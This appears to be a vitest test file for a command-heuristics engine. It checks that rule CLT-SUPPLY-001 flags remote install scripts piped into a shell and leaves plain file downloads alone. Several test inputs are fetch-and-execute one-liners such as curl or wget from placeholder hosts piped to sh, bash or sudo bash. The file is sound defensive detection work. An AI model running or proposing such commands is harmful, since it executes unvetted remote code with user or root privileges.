import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("supply chain threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	it("detects curl install pipe to bash", () => {
		const ids = matchCommand(engine, "curl https://untrusted.test/install.sh | sh");
		expect(ids).toContain("CLT-SUPPLY-001");
	});

	it("detects wget install pipe to sudo sh", () => {
		const ids = matchCommand(engine, "wget https://untrusted.test/install.sh | sudo sh");
		expect(ids).toContain("CLT-SUPPLY-001");
	});

	it("does not match curl download without install in URL", () => {
		const ids = matchCommand(engine, "curl https://example.com/file.tar.gz -o file.tar.gz");
		expect(ids.filter((id) => id.startsWith("CLT-SUPPLY"))).toEqual([]);
	});

	// --- FN coverage ---

	it("detects wget install pipe to bash (001)", () => {
		expect(matchCommand(engine, "wget https://get.example.com/install.sh | bash")).toContain(
			"CLT-SUPPLY-001",
		);
	});

	it("detects curl install pipe to sudo bash (001)", () => {
		expect(matchCommand(engine, "curl https://cdn.example.com/install | sudo bash")).toContain(
			"CLT-SUPPLY-001",
		);
	});

	// --- FP coverage ---

	it("does not match curl download to file without pipe (001 FP)", () => {
		const ids = matchCommand(engine, "curl https://example.com/install.sh -o install.sh");
		expect(ids).not.toContain("CLT-SUPPLY-001");
	});

	it("does not match wget download archive (001 FP)", () => {
		const ids = matchCommand(engine, "wget https://example.com/install.tar.gz");
		expect(ids).not.toContain("CLT-SUPPLY-001");
	});
});
